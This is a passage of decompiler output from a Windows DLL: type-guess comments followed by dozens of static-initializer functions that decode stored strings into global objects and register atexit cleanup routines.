// 100BF3C0: using guessed type _DWORD dword_100BF3C0[2];
// 100BF3C8: using guessed type _DWORD dword_100BF3C8[2];
// 100BF3D0: using guessed type _DWORD dword_100BF3D0[2];
// 100BF3D8: using guessed type _DWORD dword_100BF3D8[2];
// 100BF3E0: using guessed type _DWORD dword_100BF3E0[2];
// 100BF3E8: using guessed type _DWORD dword_100BF3E8[2];
// 100BF3F0: using guessed type _DWORD dword_100BF3F0[2];
// 100BF3F8: using guessed type _DWORD dword_100BF3F8[2];
// 100BF400: using guessed type _DWORD dword_100BF400[2];
// 100BF408: using guessed type _DWORD dword_100BF408[2];
// 100BF410: using guessed type _DWORD dword_100BF410[2];
// 100BF418: using guessed type _DWORD dword_100BF418[2];
// 100BF420: using guessed type _DWORD dword_100BF420[2];
// 100BF428: using guessed type _DWORD dword_100BF428[2];
// 100BF430: using guessed type _DWORD dword_100BF430[2];
// 100BF438: using guessed type _DWORD dword_100BF438[2];
// 100BF440: using guessed type _DWORD dword_100BF440[2];
// 100BF448: using guessed type _DWORD dword_100BF448[2];
// 100BF450: using guessed type _DWORD dword_100BF450[2];
// 100BF458: using guessed type _DWORD dword_100BF458[2];
// 100BF460: using guessed type _DWORD dword_100BF460[2];
// 100BF468: using guessed type _DWORD dword_100BF468[2];
// 100BF470: using guessed type _DWORD dword_100BF470[2];
// 100BF478: using guessed type _DWORD dword_100BF478[2];
// 100BF480: using guessed type _DWORD dword_100BF480[2];
// 100BF488: using guessed type _DWORD dword_100BF488[2];
// 100BF490: using guessed type _DWORD dword_100BF490[2];
// 100BF498: using guessed type _DWORD dword_100BF498[2];
// 100BF4A0: using guessed type _DWORD dword_100BF4A0[2];
// 100BF4A8: using guessed type _DWORD dword_100BF4A8[2];
// 100BF4B0: using guessed type _DWORD dword_100BF4B0[2];
// 100BF4B8: using guessed type _DWORD dword_100BF4B8[2];
// 100BF4C0: using guessed type _DWORD dword_100BF4C0[2];
// 100BF4C8: using guessed type _DWORD dword_100BF4C8[2];
// 100BF4D0: using guessed type _DWORD dword_100BF4D0[2];
// 100BF4D8: using guessed type _DWORD dword_100BF4D8[2];
// 100BF4E0: using guessed type _DWORD dword_100BF4E0[2];
// 100BF4E8: using guessed type _DWORD dword_100BF4E8[2];
// 100BF4F0: using guessed type _DWORD dword_100BF4F0[2];
// 100BF4F8: using guessed type _DWORD dword_100BF4F8[2];
// 100BF500: using guessed type _DWORD dword_100BF500[2];
// 100BF508: using guessed type _DWORD dword_100BF508[2];
// 100BF510: using guessed type _DWORD dword_100BF510[2];
// 100BF518: using guessed type _DWORD dword_100BF518[2];
// 100BF520: using guessed type _DWORD dword_100BF520[2];
// 100BF528: using guessed type _DWORD dword_100BF528[2];
// 100BF530: using guessed type _DWORD dword_100BF530[2];
// 100BF538: using guessed type _DWORD dword_100BF538[2];
// 100BF540: using guessed type _DWORD dword_100BF540[2];
// 100BF548: using guessed type _DWORD dword_100BF548[2];
// 100BF550: using guessed type _DWORD dword_100BF550[2];
// 100BF558: using guessed type _DWORD dword_100BF558[2];
// 100BF560: using guessed type _DWORD dword_100BF560[2];
// 100BF568: using guessed type _DWORD dword_100BF568[2];
// 100BF570: using guessed type _DWORD dword_100BF570[2];

//----- (10088346) --------------------------------------------------------
int sub_10088346()
{
  sub_100017F0(dword_100BF9CC, 0);
  return atexit(sub_10089500);
}
// 100BF9CC: using guessed type _DWORD dword_100BF9CC[2];

//----- (10088360) --------------------------------------------------------
int sub_10088360()
{
  sub_1000CC20(&dword_100BF9C4, word_100B911C);
  return atexit(sub_100894F6);
}
// 100B911C: using guessed type wchar_t word_100B911C[2];
// 100BF9C4: using guessed type int dword_100BF9C4;

//----- (1008837B) --------------------------------------------------------
int sub_1008837B()
{
  sub_10001611(dword_100BF9D4);
  return atexit(sub_100894EC);
}
// 100BF9D4: using guessed type _DWORD dword_100BF9D4[2];

//----- (10088393) --------------------------------------------------------
int sub_10088393()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8F20);
  sub_1000CC20(dword_100BF5A0, v0);
  return atexit(sub_1008950A);
}
// 100BF5A0: using guessed type _DWORD dword_100BF5A0[2];

//----- (100883B5) --------------------------------------------------------
int sub_100883B5()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8F60);
  sub_1000CC20(dword_100BF5A8, v0);
  return atexit(sub_10089514);
}
// 100BF5A8: using guessed type _DWORD dword_100BF5A8[2];

//----- (100883D7) --------------------------------------------------------
int sub_100883D7()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8FE8);
  sub_1000CC20(dword_100BF590, v0);
  return atexit(sub_1008951E);
}
// 100BF590: using guessed type _DWORD dword_100BF590[2];

//----- (100883F9) --------------------------------------------------------
int sub_100883F9()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B9030);
  sub_1000CC20(dword_100BF5B8, v0);
  return atexit(sub_10089528);
}
// 100BF5B8: using guessed type _DWORD dword_100BF5B8[2];

//----- (1008841B) --------------------------------------------------------
int sub_1008841B()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B9090);
  sub_1000CC20(dword_100BF5C0, v0);
  return atexit(sub_10089532);
}
// 100BF5C0: using guessed type _DWORD dword_100BF5C0[2];

//----- (1008843D) --------------------------------------------------------
int sub_1008843D()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8FB4);
  sub_1000CC20(dword_100BF598, v0);
  return atexit(sub_1008953C);
}
// 100BF598: using guessed type _DWORD dword_100BF598[2];

//----- (1008845F) --------------------------------------------------------
int sub_1008845F()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B90D8);
  sub_1000CC20(dword_100BF5B0, v0);
  return atexit(sub_10089546);
}
// 100BF5B0: using guessed type _DWORD dword_100BF5B0[2];

//----- (10088481) --------------------------------------------------------
int sub_10088481()
{
  sub_100033DA(dword_100BF9DC, 0);
  return atexit(sub_10089550);
}
// 100BF9DC: using guessed type _DWORD dword_100BF9DC[2];

//----- (1008849B) --------------------------------------------------------
int sub_1008849B()
{
  sub_10017224((int)dword_100BF9E4);
  return atexit(sub_10089564);
}
// 100BF9E4: using guessed type int dword_100BF9E4[9];

//----- (100884B1) --------------------------------------------------------
int sub_100884B1()
{
  return atexit(sub_1008955A);
}

//----- (100884BD) --------------------------------------------------------
int sub_100884BD()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8C88);
  sub_1000CC20(dword_100BF608, v0);
  return atexit(sub_1008956E);
}
// 100BF608: using guessed type _DWORD dword_100BF608[2];

//----- (100884DF) --------------------------------------------------------
int sub_100884DF()
{
  sub_10003AC0(dword_100BC5B0, 0);
  sub_10003AC0(dword_100BC5C0, 0);
  return atexit(sub_10089578);
}
// 100BC5B0: using guessed type _DWORD dword_100BC5B0[4];
// 100BC5C0: using guessed type _DWORD dword_100BC5C0[4];

//----- (10088520) --------------------------------------------------------
int sub_10088520()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8CF0);
  sub_1000CC20(dword_100BF5E8, v0);
  return atexit(sub_10089583);
}
// 100BF5E8: using guessed type _DWORD dword_100BF5E8[2];

//----- (10088542) --------------------------------------------------------
int sub_10088542()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8D30);
  sub_1000CC20(dword_100BF5F8, v0);
  return atexit(sub_1008958D);
}
// 100BF5F8: using guessed type _DWORD dword_100BF5F8[2];

//----- (10088564) --------------------------------------------------------
int sub_10088564()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8D80);
  sub_1000CC20(dword_100BF5F0, v0);
  return atexit(sub_10089597);
}
// 100BF5F0: using guessed type _DWORD dword_100BF5F0[2];

//----- (10088586) --------------------------------------------------------
int sub_10088586()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8DD0);
  sub_1000CC20(dword_100BF5C8, v0);
  return atexit(sub_100895A1);
}
// 100BF5C8: using guessed type _DWORD dword_100BF5C8[2];

//----- (100885A8) --------------------------------------------------------
int sub_100885A8()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8E40);
  sub_1000CC20(dword_100BF5D0, v0);
  return atexit(sub_100895AB);
}
// 100BF5D0: using guessed type _DWORD dword_100BF5D0[2];

//----- (100885CA) --------------------------------------------------------
int sub_100885CA()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8E94);
  sub_1000CC20(dword_100BF600, v0);
  return atexit(sub_100895B5);
}
// 100BF600: using guessed type _DWORD dword_100BF600[2];

//----- (100885EC) --------------------------------------------------------
int sub_100885EC()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8ED0);
  sub_1000CC20(dword_100BF5E0, v0);
  return atexit(sub_100895BF);
}
// 100BF5E0: using guessed type _DWORD dword_100BF5E0[2];

//----- (1008860E) --------------------------------------------------------
int sub_1008860E()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8BD4);
  sub_1000CC20(dword_100BF5D8, v0);
  return atexit(sub_100895C9);
}
// 100BF5D8: using guessed type _DWORD dword_100BF5D8[2];

//----- (10088630) --------------------------------------------------------
int sub_10088630()
{
  wchar_t *v0; // eax
  wchar_t *v1; // eax
  wchar_t *v2; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8B08);
  sub_1000CC20(dword_100BBBE4, v0);
  v1 = (wchar_t *)sub_1000E943((int)&unk_100B8AB0);
  sub_1000CC20(dword_100BBBEC, v1);
  v2 = (wchar_t *)sub_1000E943((int)&unk_100B8A34);
  sub_1000CC20(dword_100BBBF4, v2);
  sub_1000CE26(dword_100BBBFC, (int)dword_100BF578);
  dword_100BBC04 = 0;
  dword_100BBC08 = 0;
  return atexit(sub_100895D3);
}
// 100BBBE4: using guessed type _DWORD dword_100BBBE4[2];
// 100BBBEC: using guessed type _DWORD dword_100BBBEC[2];
// 100BBBF4: using guessed type _DWORD dword_100BBBF4[2];
// 100BBBFC: using guessed type _DWORD dword_100BBBFC[2];
// 100BBC04: using guessed type int dword_100BBC04;
// 100BBC08: using guessed type int dword_100BBC08;
// 100BF578: using guessed type _DWORD dword_100BF578[2];

//----- (100886C4) --------------------------------------------------------
int sub_100886C4()
{
  wchar_t *v0; // eax
  wchar_t *v1; // eax
  wchar_t *v2; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8C08);
  sub_1000CC20(dword_100BBC10, v0);
  v1 = (wchar_t *)sub_1000E943((int)&unk_100B8B90);
  sub_1000CC20(dword_100BBC18, v1);
  v2 = (wchar_t *)sub_1000E943((int)&unk_100B8B48);
  sub_1000CC20(dword_100BBC20, v2);
  sub_1000CE26(dword_100BBC28, (int)dword_100BF074);
  dword_100BBC30 = 0;
  dword_100BBC34 = 0;
  return atexit(sub_100895DE);
}
// 100BBC10: using guessed type _DWORD dword_100BBC10[2];
// 100BBC18: using guessed type _DWORD dword_100BBC18[2];
// 100BBC20: using guessed type _DWORD dword_100BBC20[2];
// 100BBC28: using guessed type _DWORD dword_100BBC28[2];
// 100BBC30: using guessed type int dword_100BBC30;
// 100BBC34: using guessed type int dword_100BBC34;
// 100BF074: using guessed type int dword_100BF074[3];

//----- (10088758) --------------------------------------------------------
int sub_10088758()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8C48);
  sub_1000CC20(dword_100BF618, v0);
  return atexit(sub_100895E9);
}
// 100BF618: using guessed type _DWORD dword_100BF618[2];

//----- (1008877A) --------------------------------------------------------
int sub_1008877A()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8A74);
  sub_1000CC20(dword_100BF610, v0);
  return atexit(sub_100895F3);
}
// 100BF610: using guessed type _DWORD dword_100BF610[2];

//----- (1008879C) --------------------------------------------------------
int sub_1008879C()
{
  sub_10017224((int)dword_100BFA08);
  return atexit(sub_10089607);
}
// 100BFA08: using guessed type int dword_100BFA08[9];

//----- (100887B2) --------------------------------------------------------
int sub_100887B2()
{
  return atexit(sub_100895FD);
}

//----- (100887BE) --------------------------------------------------------
int sub_100887BE()
{
  wchar_t *v0; // eax
  wchar_t *v1; // eax
  wchar_t *v2; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8888);
  sub_1000CC20(dword_100BC5D4, v0);
  v1 = (wchar_t *)sub_1000E943((int)&unk_100B8844);
  sub_1000CC20(dword_100BC5DC, v1);
  v2 = (wchar_t *)sub_1000E943((int)&unk_100B87F8);
  sub_1000CC20(dword_100BC5E4, v2);
  sub_1000CE26(dword_100BC5EC, (int)dword_100BF06C);
  return atexit(sub_10089611);
}
// 100BC5D4: using guessed type _DWORD dword_100BC5D4[2];
// 100BC5DC: using guessed type _DWORD dword_100BC5DC[2];
// 100BC5E4: using guessed type _DWORD dword_100BC5E4[2];
// 100BC5EC: using guessed type _DWORD dword_100BC5EC[2];
// 100BF06C: using guessed type _DWORD dword_100BF06C[2];

//----- (10088840) --------------------------------------------------------
int sub_10088840()
{
  wchar_t *v0; // eax
  wchar_t *v1; // eax
  wchar_t *v2; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8910);
  sub_1000CC20(dword_100BC5F8, v0);
  v1 = (wchar_t *)sub_1000E943((int)&unk_100B87BC);
  sub_1000CC20(dword_100BC600, v1);
  v2 = (wchar_t *)sub_1000E943((int)&unk_100B88C8);
  sub_1000CC20(dword_100BC608, v2);
  sub_1000CE26(dword_100BC610, (int)dword_100BF580);
  return atexit(sub_1008961C);
}
// 100BC5F8: using guessed type _DWORD dword_100BC5F8[2];
// 100BC600: using guessed type _DWORD dword_100BC600[2];
// 100BC608: using guessed type _DWORD dword_100BC608[2];
// 100BC610: using guessed type _DWORD dword_100BC610[2];
// 100BF580: using guessed type _DWORD dword_100BF580[2];

//----- (100888C2) --------------------------------------------------------
int sub_100888C2()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8950);
  sub_1000CC20(dword_100BF620, v0);
  return atexit(sub_10089627);
}
// 100BF620: using guessed type _DWORD dword_100BF620[2];

//----- (100888E4) --------------------------------------------------------
int sub_100888E4()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8994);
  sub_1000CC20(dword_100BF628, v0);
  return atexit(sub_10089631);
}
// 100BF628: using guessed type _DWORD dword_100BF628[2];

//----- (10088906) --------------------------------------------------------
int sub_10088906()
{
  wchar_t *v0; // eax
  wchar_t *v1; // eax
  wchar_t *v2; // eax
  wchar_t *v3; // eax
  wchar_t *v4; // eax
  wchar_t *v5; // eax
  wchar_t *v6; // eax
  wchar_t *v7; // eax
  wchar_t *v8; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8748);
  sub_1000CC20(dword_100BF630, v0);
  v1 = (wchar_t *)sub_1000E943((int)&unk_100B8710);
  sub_1000CC20(dword_100BF638, v1);
  v2 = (wchar_t *)sub_1000E943((int)&unk_100B86D4);
  sub_1000CC20(dword_100BF640, v2);
  v3 = (wchar_t *)sub_1000E943((int)&unk_100B8694);
  sub_1000CC20(dword_100BF648, v3);
  v4 = (wchar_t *)sub_1000E943((int)&unk_100B8658);
  sub_1000CC20(dword_100BF650, v4);
  v5 = (wchar_t *)sub_1000E943((int)&unk_100B8624);
  sub_1000CC20(dword_100BF658, v5);
  v6 = (wchar_t *)sub_1000E943((int)&unk_100B85EC);
  sub_1000CC20(dword_100BF660, v6);
  v7 = (wchar_t *)sub_1000E943((int)&unk_100B8524);
  sub_1000CC20(dword_100BF668, v7);
  v8 = (wchar_t *)sub_1000E943((int)&unk_100B85A8);
  sub_1000CC20(dword_100BF670, v8);
  return atexit(sub_1008963B);
}
// 100BF630: using guessed type _DWORD dword_100BF630[2];
// 100BF638: using guessed type _DWORD dword_100BF638[2];
// 100BF640: using guessed type _DWORD dword_100BF640[2];
// 100BF648: using guessed type _DWORD dword_100BF648[2];
// 100BF650: using guessed type _DWORD dword_100BF650[2];
// 100BF658: using guessed type _DWORD dword_100BF658[2];
// 100BF660: using guessed type _DWORD dword_100BF660[2];
// 100BF668: using guessed type _DWORD dword_100BF668[2];
// 100BF670: using guessed type _DWORD dword_100BF670[2];

//----- (10088A11) --------------------------------------------------------
int sub_10088A11()
{
  sub_1000999B((int)dword_100BFA38, 0);
  return atexit(sub_10089663);
}
// 100BFA38: using guessed type _DWORD dword_100BFA38[2];

//----- (10088A29) --------------------------------------------------------
int sub_10088A29()
{
  sub_100099CF((int)dword_100BFA2C, 0);
  return atexit(sub_10089659);
}
// 100BFA2C: using guessed type _DWORD dword_100BFA2C[2];

//----- (10088A41) --------------------------------------------------------
int sub_10088A41()
{
  sub_1000ABCD(dword_100BFA44);
  return atexit(sub_1008964F);
}
// 100BFA44: using guessed type _DWORD dword_100BFA44[2];

//----- (10088A59) --------------------------------------------------------
int sub_10088A59()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8498);
  sub_1000CC20(dword_100BF680, v0);
  return atexit(sub_1008966D);
}
// 100BF680: using guessed type _DWORD dword_100BF680[2];

//----- (10088A7B) --------------------------------------------------------
int sub_10088A7B()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B84D8);
  sub_1000CC20(dword_100BF690, v0);
  return atexit(sub_10089677);
}
// 100BF690: using guessed type _DWORD dword_100BF690[2];

//----- (10088A9D) --------------------------------------------------------
int sub_10088A9D()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8560);
  sub_1000CC20(dword_100BF688, v0);
  return atexit(sub_10089681);
}
// 100BF688: using guessed type _DWORD dword_100BF688[2];

//----- (10088ABF) --------------------------------------------------------
int sub_10088ABF()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B834C);
  sub_1000CC20(dword_100BF678, v0);
  return atexit(sub_1008968B);
}
// 100BF678: using guessed type _DWORD dword_100BF678[2];

//----- (10088AE1) --------------------------------------------------------
int sub_10088AE1()
{
  wchar_t *v0; // eax
  wchar_t *v1; // eax
  wchar_t *v2; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8410);
  sub_1000CC20(dword_100BC61C, v0);
  v1 = (wchar_t *)sub_1000E943((int)&unk_100B83C8);
  sub_1000CC20(dword_100BC624, v1);
  v2 = (wchar_t *)sub_1000E943((int)&unk_100B8380);
  sub_1000CC20(dword_100BC62C, v2);
  sub_1000CE26(dword_100BC634, (int)dword_100BF064);
  return atexit(sub_10089695);
}
// 100BC61C: using guessed type _DWORD dword_100BC61C[2];
// 100BC624: using guessed type _DWORD dword_100BC624[2];
// 100BC62C: using guessed type _DWORD dword_100BC62C[2];
// 100BC634: using guessed type _DWORD dword_100BC634[2];
// 100BF064: using guessed type _DWORD dword_100BF064[2];

//----- (10088B63) --------------------------------------------------------
int sub_10088B63()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8450);
  sub_1000CC20(dword_100BF698, v0);
  return atexit(sub_1008969A);
}
// 100BF698: using guessed type _DWORD dword_100BF698[2];

//----- (10088B85) --------------------------------------------------------
int sub_10088B85()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B81A0);
  sub_1000CC20(dword_100BF6B0, v0);
  return atexit(sub_100896A4);
}
// 100BF6B0: using guessed type _DWORD dword_100BF6B0[2];

//----- (10088BA7) --------------------------------------------------------
int sub_10088BA7()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8208);
  sub_1000CC20(dword_100BF6A8, v0);
  return atexit(sub_100896AE);
}
// 100BF6A8: using guessed type _DWORD dword_100BF6A8[2];

//----- (10088BC9) --------------------------------------------------------
int sub_10088BC9()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8284);
  sub_1000CC20(dword_100BF6A0, v0);
  return atexit(sub_100896B8);
}
// 100BF6A0: using guessed type _DWORD dword_100BF6A0[2];

//----- (10088BEB) --------------------------------------------------------
int sub_10088BEB()
{
  sub_10017224((int)dword_100BFA4C);
  return atexit(sub_100896CC);
}
// 100BFA4C: using guessed type int dword_100BFA4C[9];

//----- (10088C01) --------------------------------------------------------
int sub_10088C01()
{
  return atexit(sub_100896C2);
}

//----- (10088C0D) --------------------------------------------------------
int sub_10088C0D()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7E70);
  sub_1000CC20(dword_100BF6E0, v0);
  return atexit(sub_100896D6);
}
// 100BF6E0: using guessed type _DWORD dword_100BF6E0[2];

//----- (10088C2F) --------------------------------------------------------
int sub_10088C2F()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7EB0);
  sub_1000CC20(dword_100BF6E8, v0);
  return atexit(sub_100896E0);
}
// 100BF6E8: using guessed type _DWORD dword_100BF6E8[2];

//----- (10088C51) --------------------------------------------------------
int sub_10088C51()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7EF8);
  sub_1000CC20(&dword_100BF6C8, v0);
  return atexit(sub_100896EA);
}
// 100BF6C8: using guessed type int dword_100BF6C8;

//----- (10088C73) --------------------------------------------------------
int sub_10088C73()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7F88);
  sub_1000CC20(&dword_100BF6C0, v0);
  return atexit(sub_100896F4);
}
// 100BF6C0: using guessed type int dword_100BF6C0;

//----- (10088C95) --------------------------------------------------------
int sub_10088C95()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7FC8);
  sub_1000CC20(dword_100BF6B8, v0);
  return atexit(sub_100896FE);
}
// 100BF6B8: using guessed type _DWORD dword_100BF6B8[2];

//----- (10088CB7) --------------------------------------------------------
int sub_10088CB7()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8010);
  sub_1000CC20(&dword_100BF6D8, v0);
  return atexit(sub_10089708);
}
// 100BF6D8: using guessed type int dword_100BF6D8;

//----- (10088CD9) --------------------------------------------------------
int sub_10088CD9()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B8068);
  sub_1000CC20(&dword_100BF6D0, v0);
  return atexit(sub_10089712);
}
// 100BF6D0: using guessed type int dword_100BF6D0;

//----- (10088CFB) --------------------------------------------------------
int sub_10088CFB()
{
  sub_10017224((int)dword_100BFA70);
  return atexit(sub_10089726);
}
// 100BFA70: using guessed type int dword_100BFA70[9];

//----- (10088D11) --------------------------------------------------------
int sub_10088D11()
{
  return atexit(sub_1008971C);
}

//----- (10088D1D) --------------------------------------------------------
int sub_10088D1D()
{
  sub_1002A17B(&dword_100BF6F0);
  return atexit(sub_10089730);
}
// 100BF6F0: using guessed type _DWORD dword_100BF6F0;

//----- (10088D35) --------------------------------------------------------
int sub_10088D35()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7DAC);
  sub_1000CC20(dword_100BF6F8, v0);
  return atexit(sub_1008973A);
}
// 100BF6F8: using guessed type _DWORD dword_100BF6F8[2];

//----- (10088D57) --------------------------------------------------------
int sub_10088D57()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7C4C);
  sub_1000CC20(dword_100BF728, v0);
  return atexit(sub_10089744);
}
// 100BF728: using guessed type _DWORD dword_100BF728[2];

//----- (10088D79) --------------------------------------------------------
int sub_10088D79()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7C7C);
  sub_1000CC20(dword_100BF720, v0);
  return atexit(sub_1008974E);
}
// 100BF720: using guessed type _DWORD dword_100BF720[2];

//----- (10088D9B) --------------------------------------------------------
int sub_10088D9B()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7CB0);
  sub_1000CC20(dword_100BF700, v0);
  return atexit(sub_10089758);
}
// 100BF700: using guessed type _DWORD dword_100BF700[2];

//----- (10088DBD) --------------------------------------------------------
int sub_10088DBD()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7CE0);
  sub_1000CC20(dword_100BF708, v0);
  return atexit(sub_10089762);
}
// 100BF708: using guessed type _DWORD dword_100BF708[2];

//----- (10088DDF) --------------------------------------------------------
int sub_10088DDF()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7D10);
  sub_1000CC20(dword_100BF718, v0);
  return atexit(sub_1008976C);
}
// 100BF718: using guessed type _DWORD dword_100BF718[2];

//----- (10088E01) --------------------------------------------------------
int sub_10088E01()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7D40);
  sub_1000CC20(dword_100BF710, v0);
  return atexit(sub_10089776);
}
// 100BF710: using guessed type _DWORD dword_100BF710[2];

//----- (10088E23) --------------------------------------------------------
int sub_10088E23()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7D70);
  sub_1000CC20(dword_100BF730, v0);
  return atexit(sub_10089780);
}
// 100BF730: using guessed type _DWORD dword_100BF730[2];

//----- (10088E45) --------------------------------------------------------
int sub_10088E45()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7860);
  sub_1000CC20(dword_100BF738, v0);
  return atexit(sub_1008978A);
}
// 100BF738: using guessed type _DWORD dword_100BF738[2];

//----- (10088E67) --------------------------------------------------------
int sub_10088E67()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7810);
  sub_1000CC20(dword_100BF740, v0);
  return atexit(sub_10089794);
}
// 100BF740: using guessed type _DWORD dword_100BF740[2];

//----- (10088E89) --------------------------------------------------------
int sub_10088E89()
{
  return atexit(nullsub_4);
}

//----- (10088E95) --------------------------------------------------------
int sub_10088E95()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B77DC);
  sub_1000CC20(&dword_100BF74C, v0);
  return atexit(sub_1008979F);
}
// 100BF74C: using guessed type int dword_100BF74C;

//----- (10088EB7) --------------------------------------------------------
int sub_10088EB7()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B76B0);
  sub_1000CC20(dword_100BF76C, v0);
  return atexit(sub_100897A9);
}
// 100BF76C: using guessed type _DWORD dword_100BF76C[2];

//----- (10088ED9) --------------------------------------------------------
int sub_10088ED9()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B76F0);
  sub_1000CC20(dword_100BF764, v0);
  return atexit(sub_100897B3);
}
// 100BF764: using guessed type _DWORD dword_100BF764[2];

//----- (10088EFB) --------------------------------------------------------
int sub_10088EFB()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7748);
  sub_1000CC20(dword_100BF754, v0);
  return atexit(sub_100897BD);
}
// 100BF754: using guessed type _DWORD dword_100BF754[2];

//----- (10088F1D) --------------------------------------------------------
int sub_10088F1D()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7790);
  sub_1000CC20(dword_100BF75C, v0);
  return atexit(sub_100897C7);
}
// 100BF75C: using guessed type _DWORD dword_100BF75C[2];

//----- (10088F3F) --------------------------------------------------------
int sub_10088F3F()
{
  sub_1002A17B(&dword_100BF774);
  return atexit(sub_100897D1);
}
// 100BF774: using guessed type _DWORD dword_100BF774;

//----- (10088F57) --------------------------------------------------------
int sub_10088F57()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B722C);
  sub_1000CC20(dword_100BF77C, v0);
  return atexit(sub_100897DB);
}
// 100BF77C: using guessed type _DWORD dword_100BF77C[2];

//----- (10088F79) --------------------------------------------------------
char *sub_10088F79()
{
  char *result; // eax

  result = (char *)sub_1000E8F9((int)&unk_100B7268);
  dword_100BBC3C = result;
  return result;
}

//----- (10088F8A) --------------------------------------------------------
char *sub_10088F8A()
{
  char *result; // eax

  result = (char *)sub_1000E8F9((int)&unk_100B7288);
  dword_100BBC38 = result;
  return result;
}

//----- (10088F9B) --------------------------------------------------------
int sub_10088F9B()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7028);
  sub_1000CC20(dword_100BF794, v0);
  return atexit(sub_100897E5);
}
// 100BF794: using guessed type _DWORD dword_100BF794[2];

//----- (10088FBD) --------------------------------------------------------
int sub_10088FBD()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7068);
  sub_1000CC20(dword_100BF784, v0);
  return atexit(sub_100897EF);
}
// 100BF784: using guessed type _DWORD dword_100BF784[2];

//----- (10088FDF) --------------------------------------------------------
int sub_10088FDF()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B70A0);
  sub_1000CC20(dword_100BF78C, v0);
  return atexit(sub_100897F9);
}
// 100BF78C: using guessed type _DWORD dword_100BF78C[2];

//----- (10089001) --------------------------------------------------------
int sub_10089001()
{
  sub_10024AE4(dword_100BFA94);
  return atexit(sub_10089803);
}
// 100BFA94: using guessed type _DWORD dword_100BFA94[3];

